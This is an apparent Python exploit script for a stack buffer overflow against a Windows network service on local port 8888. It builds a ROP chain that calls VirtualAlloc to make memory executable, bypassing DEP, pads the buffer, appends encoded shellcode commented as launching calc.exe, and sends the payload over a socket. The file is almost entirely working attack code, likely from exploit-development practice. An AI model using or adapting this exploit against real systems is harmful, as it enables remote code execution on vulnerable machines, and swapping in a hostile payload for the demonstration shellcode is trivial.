import socket
import struct


'''
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
'''

##################################
# return address ==> 0x61F8F611 
##################################
##################################
def create_rop_chain():
        rop_gadgets = [
                # Kernel32!VirtualAlloc ## Names in KERNEL32, item 2476
                # Address=75EEF660
                # Section=.text
                # Type=Export  (Known)
                # Name=VirtualAlloc

                0x61b9eab6, #0x620d53f4: push esp ; pop ebx ; pop esi ; ret ; (1 found)
                ## with 0x20
                0xffffffe0, # 0x20
                0x69941ea7, # 0x69941ea7: add ebx, esi ; ret ; (5 found)
                0x68aad07c, # 68aad07c 93              xchg    eax,ebx
                0x68be726b, # 68be726b 91              xchg    eax,ecx
                0x6994f6e8, # 6994f6e8 58              pop     eax
                0x75EEF660, # 75f51394          KERNEL32!VirtualAllocStub:
                #0x6fe58ce5, # 6fe58ce5 8b00            mov     eax,dword ptr [eax]
                0x6d9cb59c, # 6d9cb59c 8901            mov     dword ptr [ecx],eax



                ####################################################################
                ### try to go to 46464646 ( iwil puth shellcode return addrs on that )
                ####################################################################
                0x68be726b, # 68be726b 91              xchg    eax,ecx
                0x61e30fe3, # pop edx ; ret ; (4 found)
                0x01,
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68be726b, # 68be726b 91              xchg    eax,ecx


                
                ##################################################################
                # put Shellcode return address '0x198'
                ##################################################################
                0x68ad42ca, # 0x68ad42ca: mov eax, ecx ; ret ; (2 found)
                0x61e30fe3, # pop edx ; ret ; (4 found)
                0x198,      # dd eax + 0x198
                0x68ad91ab, # 0x68ad91ab: add eax, edx ; ret ; (7 found)
                0x6d9cb59c, # 6d9cb59c 8901            mov     dword ptr [ecx],eax
                ####################################################################



                ####################################################################
                ### try to go to 47474747 ( iwil put lpAddress on that )
                ####################################################################
                0x68be726b, # 68be726b 91              xchg    eax,ecx
                0x61e30fe3, # pop edx ; ret ; (4 found)
                0x01,
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68be726b, # 68be726b 91              xchg    eax,ecx



                ##################################################################
                # put lpAddress 'the return address and Lpaddress is same' 
                ##################################################################
                0x6d9cb59c, # 6d9cb59c 8901            mov     dword ptr [ecx],eax
                ##################################################################


                ####################################################################
                ### try to go to 48484848 ( iwil put dwSize on that )
                ####################################################################
                0x68be726b, # 68be726b 91              xchg    eax,ecx
                0x61e30fe3, # pop edx ; ret ; (4 found)
                0x01,
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68be726b, # 68be726b 91              xchg    eax,ecx


                
                ####################################################################
                # put dwSize
                ####################################################################
                0x61e30fe3, # pop edx ; ret ; (4 found)
                0xffffffff,
                0x61dcffca, # 0x61dcffca: xchg eax, edx ; ret ; (2 found)
                0x66e19b1a, # 0x66e19b1a: neg eax ; ret ; (1 found)
                0x6d9cb59c, # 6d9cb59c 8901            mov     dword ptr [ecx],eax
                ####################################################################



                ####################################################################
                ### try to go to 49494949 ( iwil put flAllocationType on that )
                ####################################################################
                0x68be726b, # 68be726b 91              xchg    eax,ecx
                0x61e30fe3, # pop edx ; ret ; (4 found)
                0x01,
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68be726b, # 68be726b 91              xchg    eax,ecx



                ####################################################################
                # put flAllocationType
                ####################################################################
                0x61e30fe3,    # pop edx ; ret ; (4 found) - Load 0x03e8 into edx
                0xffffefff,    # The value 1001
                0x6feac8a3,    # 0x6feac8a3: mov eax, edx ; ret ; (4 found)
                0x66e19b1a,    # 0x66e19b1a: neg eax ; ret ; (1 found)
                0x61ba5ae5,    # 0x61ba5ae5: dec eax ; ret 
                0x6d9cb59c,    # mov dword ptr [ecx], eax ; (store eax at address in ecx)
                ####################################################################



                ####################################################################
                ### try to go to 51515151 ( iwil put flProtect on that )
                ####################################################################
                0x68be726b, # 68be726b 91              xchg    eax,ecx
                0x61e30fe3, # pop edx ; ret ; (4 found)
                0x01,
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68ad91ab, # add eax, edx ; ret ; (7 found)
                0x68be726b, # 68be726b 91              xchg    eax,ecx



                ####################################################################
                # put flProtect
                # PAGE_EXECUTE_READWRITE
                # 0x40
                ####################################################################
                0x61e30fe3, # pop edx ; ret ; (4 found)
                0xffffffc0,
                0x61dcffca, # 0x61dcffca: xchg eax, edx ; ret ; (2 found)
                0x66e19b1a, # 0x66e19b1a: neg eax ; ret ; (1 found)
                0x6d9cb59c, # 6d9cb59c 8901            mov     dword ptr [ecx],eax
                ####################################################################

                ########
                # Done #
                ####################################################################
                # lets try to put the VA at stack pointer                          #
                ####################################################################
                0x68ad42ca, # 0x68ad42ca: mov eax, ecx ; ret ; (2 found)
                0x61e30fe3, # pop edx ; ret ; (4 found)
                0xffffffec,
                0x68ad91ab, # 0x68ad91ab: add eax, edx ; ret ; (7 found)
                0x6fe4b4df, # 6fe4b4df 94              xchg    eax,esp
                
                #0x6eb47012, # 6eb47012 f7da            neg     edx
                #0x61b80c4b, # 61b80c4b 83c414          add     esp,14h
                #0x66e01c1b, #0x66e01c1b: add esp, 0x18 ; pop ebx ; ret ; (27 found)
                #0x6eb47012, # 6eb47012 f7da            neg     edx
                #0x68ae7ee3, # POP EAX
                #0x75eef660,
                #0x68a82bf6, # 68a82bf6 50              push    eax
                ####################################################################                
                
  	]
        return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
#############################
rop = create_rop_chain()
#############################
# VA placeHolder
VirtulaAlloc_PlaceHolder = struct.pack('<I', 0x45454545) 
VirtulaAlloc_PlaceHolder += struct.pack('<I', 0x46464646)
VirtulaAlloc_PlaceHolder += struct.pack('<I', 0x47474747)
VirtulaAlloc_PlaceHolder += struct.pack('<I', 0x48484848)
VirtulaAlloc_PlaceHolder += struct.pack('<I', 0x49494949)
VirtulaAlloc_PlaceHolder += struct.pack('<I', 0x51515151)
#
target="127.0.0.1"
#
junk=b"\x41" * (1052 - len(VirtulaAlloc_PlaceHolder))
junk+=VirtulaAlloc_PlaceHolder
junk += struct.pack('<I', 0x61F8F611) # b"\x42"*4 # 61F8F611   C3               RETN
junk += rop
junk+=b"\xcc"*8
junk += b"\x43"*(1500 - len(junk))
#
#########################################################################
# Shellcode calc.exe
shellcode = ""
shellcode += "\xdb\xde\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x31\xba\xef"
shellcode += "\xc3\xbd\x59\x83\xc0\x04\x31\x50\x14\x03\x50\xfb\x21"
shellcode += "\x48\xa5\xeb\x24\xb3\x56\xeb\x48\x3d\xb3\xda\x48\x59"
shellcode += "\xb7\x4c\x79\x29\x95\x60\xf2\x7f\x0e\xf3\x76\xa8\x21"
shellcode += "\xb4\x3d\x8e\x0c\x45\x6d\xf2\x0f\xc5\x6c\x27\xf0\xf4"
shellcode += "\xbe\x3a\xf1\x31\xa2\xb7\xa3\xea\xa8\x6a\x54\x9f\xe5"
shellcode += "\xb6\xdf\xd3\xe8\xbe\x3c\xa3\x0b\xee\x92\xb8\x55\x30"
shellcode += "\x14\x6d\xee\x79\x0e\x72\xcb\x30\xa5\x40\xa7\xc2\x6f"
shellcode += "\x99\x48\x68\x4e\x16\xbb\x70\x96\x90\x24\x07\xee\xe3"
shellcode += "\xd9\x10\x35\x9e\x05\x94\xae\x38\xcd\x0e\x0b\xb9\x02"
shellcode += "\xc8\xd8\xb5\xef\x9e\x87\xd9\xee\x73\xbc\xe5\x7b\x72"
shellcode += "\x13\x6c\x3f\x51\xb7\x35\x9b\xf8\xee\x93\x4a\x04\xf0"
shellcode += "\x7c\x32\xa0\x7a\x90\x27\xd9\x20\xfe\xb6\x6f\x5f\x4c"
shellcode += "\xb8\x6f\x60\xe0\xd1\x5e\xeb\x6f\xa5\x5e\x3e\xd4\x59"
shellcode += "\x15\x63\x7c\xf2\xf0\xf1\x3d\x9f\x02\x2c\x01\xa6\x80"
shellcode += "\xc5\xf9\x5d\x98\xaf\xfc\x1a\x1e\x43\x8c\x33\xcb\x63"
shellcode += "\x23\x33\xde\x07\xa2\xa7\x82\xe9\x41\x40\x20\xf6"
#########################################################################


payload = junk + shellcode

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(payload)
except:
	print "Crashed!"
            
